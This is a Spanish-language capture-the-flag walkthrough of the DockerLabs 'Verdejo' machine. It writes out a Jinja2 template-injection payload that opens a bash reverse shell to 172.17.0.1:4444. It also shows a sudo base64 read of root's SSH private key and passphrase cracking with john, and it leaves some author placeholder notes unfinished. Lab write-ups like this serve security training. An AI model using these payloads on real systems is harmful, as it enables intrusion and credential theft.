---
title: Verdejo - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | The Hackers Labs        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/52adb1eb-cff8-4d4e-a4a8-de78bddd1615)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `22` (SSH)
- `80` (HTTP)
- `8089` (Que servicio es)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p22,80,8089 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/e6b57a30-2b81-4d4f-b542-464e63077507)

# Exploración Web
Al acceder al puerto `80`, encontramos una página de defecto de apache si nada mas aparente.

tilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/70c4ecce-ca0a-4d06-ad25-df06f798536e)

No encontramos nada aparentemente.

Accedemos al puerto `8089` 
![image](https://github.com/user-attachments/assets/bdf26108-2443-4cf4-a84f-ecfaeb317c61)

Vemos que hay un panel en el cual si escribimos algo lo llega a intrepetrar, por lo que podria ser un `SSTI`(Explica muy brevemente que es)

![image](https://github.com/user-attachments/assets/d8d32cff-03e2-4689-b6e0-b7fe78a84038)

Probando con la ayuda de este recurso [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) , estamos detras un un Jinja2.

![image](https://github.com/user-attachments/assets/e20d1cce-a914-4853-aa3b-0619ce37793a)
```url
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

# ReverseShell

Vamos a generar una shell con el siguiente comando:
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\'').read() }}
```
Simultaneamnete ejecutamos `netcat`.
```bash
nc -lvnp 4444 
```
# Intrusion

Ya estamos dentro con el usuario verde.

![image](https://github.com/user-attachments/assets/0ff21c80-8adb-4e33-9a2a-1745f392917e)

## TTY ReverseShell

### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
### Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos
```bash
Control+Z
```
para suspender temporalmente nuestra shell.

### Preparar nuestro terminal local:
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```

### Configura el tipo de terminal:
```bash
xterm
export TERM=xterm
export SHELL=bash
```

# Escalada de privilegios
Al ejecutar `sudo -l`, notamos que tiene permisos para ejecutar `base64` como `root`.Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/63317767-ddae-4a03-b9ea-cde31b348add)

Con base64 podemos leer archivos como root, entonces recordando que tenemos el puerto 22 abierto podemos ver el id_rsa de root.
```bash
LFILE=/root/.ssh/id_rsa 
sudo -u root /usr/bin/base64 "$LFILE" | base64 --decode
```
![image](https://github.com/user-attachments/assets/8c502e29-b772-4250-8916-03aa633b3b70)

Lo pasasmos a nuestro equipo y accedemo por ssh, pero por pide una contraseña.

![image](https://github.com/user-attachments/assets/8ce2c627-762f-4ba1-935b-7297e15df618)

## Fuerza Bruta

Vamos a hacer fuerza bruta a ver si esta la contraseña, para ello haremos lo siguiente:

Sacamos el hash de la id_rsa
```bash
ssh2john id_rsa > hash
```

Pasamos a crackearlo para intentar sacar la passphrase
```bash
sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
Tenemos una contraseña `honda1`.

![image](https://github.com/user-attachments/assets/98107efa-16bb-4552-b479-0427fe3c7b86)

Volvemos a acceder con root a traves de ssh.

![image](https://github.com/user-attachments/assets/cc2c4a79-c58e-45eb-95dc-6793cf3836f9)

Ya somos root.




